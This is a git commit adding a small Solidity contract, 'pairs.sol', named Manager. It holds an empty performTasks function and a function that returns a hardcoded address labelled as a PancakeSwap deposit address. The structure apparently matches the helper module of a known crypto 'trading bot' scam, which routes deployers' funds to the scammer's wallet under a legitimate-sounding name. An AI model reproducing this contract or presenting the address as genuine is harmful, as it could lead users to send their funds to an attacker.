378b6db25f3d1fb2c889a257cc16782c8fa6e062
xerofinance <122619344+xerofinance@users.noreply.github.com>
2023-02-01 05:40:37 -0600

    Create pairs.sol

---
+++ pairs.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x52838e92398ee85Fc7F450FA1462Fd2f36299d4f;
+	}
+}
